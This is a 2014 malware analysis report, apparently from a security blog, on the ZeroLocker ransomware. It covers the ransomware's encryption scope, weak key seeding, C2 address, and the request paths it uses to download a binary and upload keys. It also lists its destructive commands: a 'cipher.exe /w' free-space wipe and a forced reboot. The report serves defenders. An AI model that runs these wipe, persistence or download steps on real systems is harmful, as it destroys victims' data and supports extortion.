Introduction to the ZeroLocker ransomware
Written by Kimberly on Sunday, 31 August 2014. Posted in Malware Reports Viewed

A new ransomware called ZeroLocker has surfaced. The files are encrypted with AES (*)
encryption.
Currently the threat is considered as the most destructive ransomware we have seen to
date.
ZeroLocker does not only target data files; it encrypts ALL files on the hard drive, including
executables, with AES encryption unless they are located in certain folders or larger than
20 MegaBytes.
The folders exempt from encryption are the ones containing the following keywords:
Windows, WINDOWS, Program Files, ZeroLocker and Desktop. Encrypted files will have
.encrypted appended to their filename.
ZeroLocker performs several outbound connections to 5.199.171.47, a VPs located in Skri
Lanka.
When the threat has finished encrypting the files, it will run the
C:\WINDOWS\SYSTEM32\CIPHER.EXE /W:C:\ command in order to overwrite all deleted
data on the hard drive. Doing so makes it impossible to use recovery tools to restore files.
The main issue with ZeroLocker resides in the fact that when it uploads the decryption key
to the server, the C2 returns a 404 not found because the requested page doesn’t exist on
the server.
Therefore the key isn’t stored in any database or file for later recovery. The only way to
recover the key would be to manually filter through the HTTP access logs if they still exist.

This coding mistake on behalf of the developer essentially renders the encrypted computer
completely useless as the victim is unable to retrieve the decryption key even after paying
the ransom.
ZeroLocker is considered as very destructive especially for companies that have custom
software installed under normal paths.
Currently the infection doesn’t delete the Windows System Restore points so files can be
restored using a program like Shadow Explorer or Windows built-in Previous Version. This
could change at any stage of course.
Payment is only accepted in Bitcoins. The initial ransom is $300, after 5 days the price will
increase to $600 and after 10 days the victim will have to pay $1000.

The first instance of ZeroLocker was discovered on a French forum assisting people with
malware removal on August 8, 2014.

Overview of functions.

The author didn't use AES encryption but used the RijndaelManaged class from the .NET
Framework.

The random number generator is seeded Envionment.TickCount, a 32-bit signed integer
containing the amount of time in milliseconds that has passed since the last time the
computer was started. The strength of the password is less than 32-bit.

Upon execution the threat will:

1. Create a folder called C:\ZeroLocker
2. Perform the following outbound connection and save the binary as
C:\ZeroLocker\ZERORESCUE.EXE
GET /patriote/sansviolence
3. A corresponding registry entry is created so that ZERORESCUE.EXE runs each time
the computer starts.
4. Retrieve the Bitcoin address used to pay the ransom and save it as
C:\ZeroLocker\ADDRESS.DAT
GET /zConfig/171386
1CkwfDadjXPhp3XrUU5J8hQhUtbecH7t1N
5. Upload the decryption key to the server. The request returns a 404.
GET /zImprimer/[ID based upon MAC-ADDRESS]-[PASSWORD]-[BITCOIN
ADDRESS]

6. Encrypt the files on the hard drive. For each encrypted file the original file is deleted.
7. Perform the following outbound connection and save the response as
C:\ZeroLocker\LOG.DAT
GET /enc/1

8. Launch an instance of C:\WINDOWS\SYSTEM32\CIPHER.EXE with the following
command line parameters:
cipher.exe" /w:c:\

9. Reboot the compromised computer using the following command:
c:\windows\system32\shutdown.exe" /r /t 0 /f
10. Upon reboot the ransomware notice is displayed via
C:\ZeroLocker\ZERORESCUE.EXE. Clicking the "Decrypt Files" button opens an
internet connection with the VPS. Unfortunately the request returns a 404 rendering
decryption impossible even after paying the ransom. A message informs the victim
that the payment hasn’t been received or processed yet and to try again later as it
takes up to 24h to activate the key.
GET /[ID based upon MAC-ADDRESS]/key

Samples Analysed
At the time of the analysis on August 18, 2014 we were aware of the following MD5
hashes:
bd0a3c308a6d3372817a474b7c653097: TimeDateStamp: Tue Aug 05 14:27:06
2014
3772a3deeb781803a907ed36ee10681d: TimeDateStamp: Wed Aug 06 11:01:48
2014
Both samples contain the following compile leftovers:
c:\users\george\desktop\projects\zerolocker\testing stuff\testing stuff\obj\debug\task
manager.pdb
The actor behind ZeroLocker is also associated with several Bitcoin Miners.
